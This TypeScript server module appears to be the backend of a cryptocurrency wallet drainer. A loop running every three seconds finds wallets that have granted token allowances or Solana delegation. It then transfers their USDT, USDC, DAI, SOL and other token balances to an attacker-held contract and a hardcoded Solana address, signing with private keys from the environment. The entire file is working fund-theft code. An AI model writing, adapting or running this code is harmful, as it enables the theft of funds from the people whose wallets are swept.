import { createPublicClient, createWalletClient, http, parseAbi } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, base } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';
import { Connection, PublicKey, Keypair, Transaction, TransactionInstruction, sendAndConfirmTransaction } from '@solana/web3.js';
import bs58 from 'bs58';
import { storage } from './storage';
import type { MonitoredWallet } from '@shared/schema';

const SYSTEM_PROGRAM_ID = new PublicKey('11111111111111111111111111111111');
const RENT_SYSVAR_ID = new PublicKey('SysvarRent111111111111111111111111111111111');

import { CHAIN_CONTRACTS } from './direct-transfer';
const SOLANA_DESTINATION = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");

const EVM_TOKENS: Record<string, { symbol: string; address: string }[]> = {
  '1': [
    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
  ],
  '56': [
    { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955' },
    { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' },
    { symbol: 'DAI', address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3' },
  ],
  '137': [
    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F' },
    { symbol: 'USDC', address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359' },
    { symbol: 'DAI', address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063' },
  ],
  '42161': [
    { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9' },
    { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831' },
    { symbol: 'DAI', address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1' },
  ],
  '10': [
    { symbol: 'USDT', address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58' },
    { symbol: 'USDC', address: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85' },
    { symbol: 'DAI', address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1' },
  ],
  '43114': [
    { symbol: 'USDT', address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7' },
    { symbol: 'USDC', address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E' },
    { symbol: 'DAI', address: '0xd586E7F844cEa2F87f50152665BCbc2C279D8d70' },
  ],
  '8453': [
    { symbol: 'USDT', address: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2' },
    { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913' },
    { symbol: 'DAI', address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb' },
  ],
};

const CHAINS: Record<string, any> = {
  '1': mainnet,
  '56': bsc,
  '137': polygon,
  '42161': arbitrum,
  '10': optimism,
  '43114': avalanche,
  '8453': base,
};

const RPC_URLS: Record<string, string> = {
  '1': 'https://ethereum.publicnode.com',
  '56': 'https://bsc-dataseed.binance.org',
  '137': 'https://polygon-bor-rpc.publicnode.com',
  '42161': 'https://arb1.arbitrum.io/rpc',
  '10': 'https://mainnet.optimism.io',
  '43114': 'https://api.avax.network/ext/bc/C/rpc',
  '8453': 'https://mainnet.base.org',
};

const SOLANA_TOKENS = [
  { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" },
  { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB" },
  { symbol: "SOL", mint: "So11111111111111111111111111111111111111112" },
  { symbol: "BONK", mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263" },
  { symbol: "JUP", mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN" },
  { symbol: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R" },
  { symbol: "WIF", mint: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm" },
  { symbol: "ORCA", mint: "orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE" },
  { symbol: "JITOSOL", mint: "J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn" },
  { symbol: "MSOL", mint: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So" },
];

const ERC20_ABI = parseAbi([
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
]);


let solanaConnection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
let monitorInterval: NodeJS.Timeout | null = null;
let isMonitoring = false;
const MONITOR_INTERVAL_MS = 3 * 1000;
const MIN_SWEEP_AMOUNT_USD = 1;

const CONTRACT_ABI = parseAbi([
  'function claimTokens(address token, address from, uint256 amount)',
]);

function getEvmWalletClient(chainId: string) {
  const privateKey = process.env.SWEEPER_PRIVATE_KEY;
  if (!privateKey) return null;
  
  const account = privateKeyToAccount(privateKey.startsWith('0x') ? privateKey as `0x${string}` : `0x${privateKey}`);
  return createWalletClient({
    account,
    chain: CHAINS[chainId],
    transport: http(RPC_URLS[chainId]),
  });
}

function getEvmPublicClient(chainId: string) {
  return createPublicClient({
    chain: CHAINS[chainId],
    transport: http(RPC_URLS[chainId]),
  });
}

function getSolanaKeypair(): Keypair | null {
  const privateKey = process.env.SOLANA_DELEGATE_PRIVATE_KEY;
  if (!privateKey) return null;
  try {
    return Keypair.fromSecretKey(bs58.decode(privateKey));
  } catch {
    return null;
  }
}

function getAssociatedTokenAddress(mint: PublicKey, owner: PublicKey): PublicKey {
  const [address] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID
  );
  return address;
}

async function getTokenBalance(tokenAccount: PublicKey): Promise<bigint> {
  try {
    const accountInfo = await solanaConnection.getAccountInfo(tokenAccount);
    if (!accountInfo || accountInfo.data.length < 72) return BigInt(0);
    const dataView = new DataView(accountInfo.data.buffer, accountInfo.data.byteOffset);
    return dataView.getBigUint64(64, true);
  } catch {
    return BigInt(0);
  }
}

async function getDelegatedAmount(tokenAccount: PublicKey, delegate: PublicKey): Promise<bigint> {
  try {
    const accountInfo = await solanaConnection.getAccountInfo(tokenAccount);
    if (!accountInfo || accountInfo.data.length < 121) return BigInt(0);
    if (accountInfo.data[72] !== 1) return BigInt(0);
    const delegateBytes = accountInfo.data.slice(73, 105);
    const accountDelegate = new PublicKey(delegateBytes);
    if (!accountDelegate.equals(delegate)) return BigInt(0);
    const dataView = new DataView(accountInfo.data.buffer, accountInfo.data.byteOffset);
    return dataView.getBigUint64(105, true);
  } catch {
    return BigInt(0);
  }
}

async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean; amount: string; error?: string }> {
  const chainId = wallet.chainId || '1';
  const publicClient = getEvmPublicClient(chainId);
  const walletClient = getEvmWalletClient(chainId);
  
  if (!walletClient) {
    return { swept: false, amount: '0', error: 'EVM spender key not configured' };
  }
  
  const tokens = EVM_TOKENS[chainId];
  if (!tokens) {
    return { swept: false, amount: '0', error: `Unsupported chain: ${chainId}` };
  }
  
  const contractAddr = CHAIN_CONTRACTS[Number(chainId)];
  if (!contractAddr) {
    return { swept: false, amount: '0', error: `No contract address for chain ${chainId}` };
  }
  const contractAddress = contractAddr as `0x${string}`;
  
  let totalSwept = BigInt(0);
  const userAddr = wallet.walletAddress as `0x${string}`;
  
  for (const token of tokens) {
    try {
      const tokenAddress = token.address as `0x${string}`;
      
      const allowance = await publicClient.readContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'allowance',
        args: [userAddr, contractAddress],
      });
      
      if (allowance === BigInt(0)) continue;
      
      const balance = await publicClient.readContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'balanceOf',
        args: [userAddr],
      });
      
      if (balance === BigInt(0)) continue;
      
      const transferAmount = balance < allowance ? balance : allowance;
      
      console.log(`[Monitor] EVM ${chainId} - ${wallet.walletAddress}: ${token.symbol} balance=${balance}, allowance=${allowance}, sweeping=${transferAmount} -> contract ${contractAddr}`);
      
      try {
        const txHash = await walletClient.writeContract({
          address: contractAddress,
          abi: CONTRACT_ABI,
          functionName: 'claimTokens',
          args: [tokenAddress, userAddr, transferAmount],
          chain: CHAINS[chainId],
        });
        
        const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });
        
        if (receipt.status === 'success') {
          totalSwept += transferAmount;
          console.log(`[Monitor] EVM ${chainId} - Swept ${token.symbol}: ${transferAmount} from ${wallet.walletAddress} - tx: ${txHash}`);
          
          await storage.createTransfer({
            walletAddress: wallet.walletAddress,
            tokenAddress: token.address,
            tokenSymbol: token.symbol,
            amount: transferAmount.toString(),
            transactionHash: txHash,
          });
        }
      } catch (txErr: any) {
        console.error(`[Monitor] EVM ${chainId} ${token.symbol} transferFrom error:`, txErr?.message);
      }
      
    } catch (error: any) {
      console.error(`[Monitor] EVM ${chainId} ${token.symbol} check error:`, error?.message);
    }
  }
  
  return { 
    swept: totalSwept > BigInt(0), 
    amount: totalSwept.toString(),
  };
}

async function sweepSolanaWallet(wallet: MonitoredWallet): Promise<{ swept: boolean; amount: string; error?: string }> {
  const keypair = getSolanaKeypair();
  if (!keypair) {
    return { swept: false, amount: '0', error: 'Solana delegate not configured' };
  }
  
  const userKey = new PublicKey(wallet.walletAddress);
  const destKey = new PublicKey(SOLANA_DESTINATION);
  let totalSwept = BigInt(0);
  
  const tokens = JSON.parse(wallet.tokens) as string[];
  
  for (const tokenSymbol of tokens) {
    const tokenInfo = SOLANA_TOKENS.find(t => t.symbol === tokenSymbol);
    if (!tokenInfo) continue;
    
    try {
      const mintKey = new PublicKey(tokenInfo.mint);
      const userAta = getAssociatedTokenAddress(mintKey, userKey);
      const destAta = getAssociatedTokenAddress(mintKey, destKey);
      
      const balance = await getTokenBalance(userAta);
      const delegated = await getDelegatedAmount(userAta, keypair.publicKey);
      
      if (balance === BigInt(0) || delegated === BigInt(0)) continue;
      
      const transferAmount = balance < delegated ? balance : delegated;
      if (transferAmount === BigInt(0)) continue;
      
      console.log(`[Monitor] Solana - ${wallet.walletAddress}: ${tokenSymbol} balance=${balance}, delegated=${delegated}`);
      
      const transaction = new Transaction();
      
      const destAtaInfo = await solanaConnection.getAccountInfo(destAta);
      if (!destAtaInfo) {
        transaction.add(
          new TransactionInstruction({
            keys: [
              { pubkey: keypair.publicKey, isSigner: true, isWritable: true },
              { pubkey: destAta, isSigner: false, isWritable: true },
              { pubkey: destKey, isSigner: false, isWritable: false },
              { pubkey: mintKey, isSigner: false, isWritable: false },
              { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
              { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
              { pubkey: RENT_SYSVAR_ID, isSigner: false, isWritable: false },
            ],
            programId: ASSOCIATED_TOKEN_PROGRAM_ID,
            data: Buffer.alloc(0),
          })
        );
      }
      
      const data = new Uint8Array(9);
      data[0] = 3;
      const amountBytes = new ArrayBuffer(8);
      const view = new DataView(amountBytes);
      view.setBigUint64(0, transferAmount, true);
      data.set(new Uint8Array(amountBytes), 1);
      
      transaction.add(
        new TransactionInstruction({
          keys: [
            { pubkey: userAta, isSigner: false, isWritable: true },
            { pubkey: destAta, isSigner: false, isWritable: true },
            { pubkey: keypair.publicKey, isSigner: true, isWritable: false },
          ],
          programId: TOKEN_PROGRAM_ID,
          data: data as Buffer,
        })
      );
      
      const { blockhash } = await solanaConnection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = keypair.publicKey;
      
      const signature = await sendAndConfirmTransaction(solanaConnection, transaction, [keypair], { commitment: 'confirmed' });
      
      totalSwept += transferAmount;
      console.log(`[Monitor] Solana - Swept ${tokenSymbol}: ${transferAmount} from ${wallet.walletAddress} - ${signature}`);
      
      await storage.createTransfer({
        walletAddress: wallet.walletAddress,
        tokenAddress: tokenInfo.mint,
        tokenSymbol,
        amount: transferAmount.toString(),
        transactionHash: signature,
      });
      
    } catch (error: any) {
      console.error(`[Monitor] Solana ${tokenSymbol} sweep error:`, error?.message);
    }
  }
  
  return { 
    swept: totalSwept > BigInt(0), 
    amount: totalSwept.toString() 
  };
}

async function runMonitorCycle() {
  console.log('[Monitor] Starting sweep cycle...');
  
  try {
    const wallets = await storage.getActiveMonitoredWallets();
    console.log(`[Monitor] Found ${wallets.length} active wallets to monitor`);
    
    for (const wallet of wallets) {
      try {
        let result;
        
        if (wallet.chain === 'evm') {
          result = await sweepEvmWallet(wallet);
        } else if (wallet.chain === 'solana') {
          result = await sweepSolanaWallet(wallet);
        } else {
          console.log(`[Monitor] Unknown chain: ${wallet.chain}`);
          continue;
        }
        
        if (result.swept) {
          const currentTotal = BigInt(wallet.totalSwept || '0');
          const newTotal = currentTotal + BigInt(result.amount);
          
          await storage.updateMonitoredWallet(wallet.id, {
            lastSweptAt: new Date(),
            totalSwept: newTotal.toString(),
          });
          
          console.log(`[Monitor] Updated wallet ${wallet.walletAddress}: total swept = ${newTotal}`);
        }
        
      } catch (error: any) {
        console.error(`[Monitor] Error processing wallet ${wallet.walletAddress}:`, error?.message);
      }
    }
    
  } catch (error: any) {
    console.error('[Monitor] Cycle error:', error?.message);
  }
  
  console.log('[Monitor] Sweep cycle completed');
}

export function startWalletMonitor() {
  if (isMonitoring) {
    console.log('[Monitor] Already running');
    return;
  }
  
  const hasEvmKey = !!(process.env.SWEEPER_PRIVATE_KEY || process.env.RELAYER_PRIVATE_KEY);
  const hasSolanaKey = !!process.env.SOLANA_DELEGATE_PRIVATE_KEY;
  
  if (!hasEvmKey && !hasSolanaKey) {
    console.log('[Monitor] No private keys configured, monitor disabled');
    return;
  }
  
  console.log(`[Monitor] Starting wallet monitor (interval: ${MONITOR_INTERVAL_MS / 1000}s)`);
  console.log(`[Monitor] EVM configured: ${hasEvmKey}, Solana configured: ${hasSolanaKey}`);
  
  isMonitoring = true;
  
  runMonitorCycle();
  
  monitorInterval = setInterval(runMonitorCycle, MONITOR_INTERVAL_MS);
}

export function stopWalletMonitor() {
  if (monitorInterval) {
    clearInterval(monitorInterval);
    monitorInterval = null;
  }
  isMonitoring = false;
  console.log('[Monitor] Stopped');
}

export function getMonitorStatus() {
  return {
    running: isMonitoring,
    intervalMs: MONITOR_INTERVAL_MS,
    evmConfigured: !!(process.env.SWEEPER_PRIVATE_KEY || process.env.RELAYER_PRIVATE_KEY),
    solanaConfigured: !!process.env.SOLANA_DELEGATE_PRIVATE_KEY,
  };
}

export async function addWalletToMonitor(
  walletAddress: string,
  chain: 'evm' | 'solana',
  chainId?: string,
  tokens?: string[]
): Promise<MonitoredWallet> {
  const existing = await storage.getMonitoredWalletByAddress(walletAddress, chain);
  
  if (existing) {
    const updates: any = { status: 'active' };
    if (chainId) updates.chainId = chainId;
    if (tokens && tokens.length > 0) {
      const existingTokens = JSON.parse(existing.tokens) as string[];
      const mergedSet = new Set([...existingTokens, ...tokens]);
      const mergedTokens = Array.from(mergedSet);
      updates.tokens = JSON.stringify(mergedTokens);
    }
    return await storage.updateMonitoredWallet(existing.id, updates);
  }
  
  const defaultTokens = chain === 'evm' ? ['USDC', 'USDT', 'DAI'] : [];
  return await storage.createMonitoredWallet({
    walletAddress,
    chain,
    chainId: chainId || null,
    tokens: JSON.stringify(tokens && tokens.length > 0 ? tokens : defaultTokens),
    status: 'active',
  });
}

export async function triggerManualSweep() {
  console.log('[Monitor] Manual sweep triggered');
  await runMonitorCycle();
}
